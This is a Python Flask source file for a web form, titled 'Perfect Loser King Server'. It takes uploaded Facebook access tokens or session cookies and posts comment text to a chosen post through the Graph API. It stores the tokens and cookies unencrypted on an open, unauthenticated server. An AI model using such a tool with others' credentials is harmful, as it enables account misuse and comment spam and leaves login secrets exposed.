from flask import Flask, request, render_template_string
import os
import requests
import time
import threading

app = Flask(__name__)

DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

TOKEN_FILE = os.path.join(DATA_DIR, "token.txt")
COOKIES_FILE = os.path.join(DATA_DIR, "cookies.txt")
COMMENT_FILE = os.path.join(DATA_DIR, "comments.txt")

def save_file(file, filename):
    if file:
        filepath = os.path.join(DATA_DIR, filename)
        file.save(filepath)

def get_post_id(post_url):
    # Extract post ID from different Facebook URL formats
    parts = post_url.split("/")
    for part in parts:
        if part.isdigit():
            return part
    return None

def post_comment(post_url, comment_text, token=None, cookies=None):
    post_id = get_post_id(post_url)
    if not post_id:
        return "[❌] Invalid or unsupported post link."

    url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
    headers = {'User-Agent': 'Mozilla/5.0'}
    payload = {'message': comment_text}

    if token:
        payload['access_token'] = token
    elif cookies:
        headers['cookie'] = cookies
    else:
        return "[❌] No valid authentication (Token or Cookies)."

    response = requests.post(url, data=payload, headers=headers)
    
    if response.ok:
        return f"[✅] Comment posted successfully: {comment_text}"
    else:
        return f"[❌] Failed: {response.status_code} {response.text}"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Perfect Loser King Server</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #000; color: white; }
        .container { background: #111; padding: 20px; width: 400px; margin: auto; border-radius: 10px; }
        h1 { color: #00ffcc; }
        input, button { padding: 10px; margin: 10px 0; width: 100%; }
        button { background-color: #00ffcc; border: none; cursor: pointer; }
        button:hover { background-color: #00cc99; }
        footer { margin-top: 20px; color: #777; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Perfect Loser King Server</h1>
        <form action="/" method="post" enctype="multipart/form-data">
            <label>Upload Token File:</label>
            <input type="file" name="token_file">
            
            <label>Upload Cookies File:</label>
            <input type="file" name="cookies_file">
            
            <label>Upload Comments File:</label>
            <input type="file" name="comment_file">

            <label>Enter Post URL:</label>
            <input type="text" name="post_url" required>

            <button type="submit">Submit & Start Commenting</button>
        </form>
        {% if message %}
            <p><strong>{{ message }}</strong></p>
        {% endif %}
        <footer>© 2025 Perfect Loser King Server</footer>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    message = ""
    
    if request.method == "POST":
        post_url = request.form.get("post_url")
        token = cookies = None

        # Save uploaded files
        if "token_file" in request.files:
            save_file(request.files["token_file"], "token.txt")
            with open(TOKEN_FILE, "r") as f:
                token = f.read().strip()

        if "cookies_file" in request.files:
            save_file(request.files["cookies_file"], "cookies.txt")
            with open(COOKIES_FILE, "r") as f:
                cookies = f.read().strip()

        if "comment_file" in request.files:
            save_file(request.files["comment_file"], "comments.txt")
            with open(COMMENT_FILE, "r") as f:
                comment_text = f.read().strip()
        else:
            comment_text = "Default Comment!"

        if not token and not cookies:
            message = "[❌] Please upload a valid token or cookies file!"
        else:
            message = post_comment(post_url, comment_text, token, cookies)

    return render_template_string(HTML_TEMPLATE, message=message)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host="0.0.0.0", port=port)
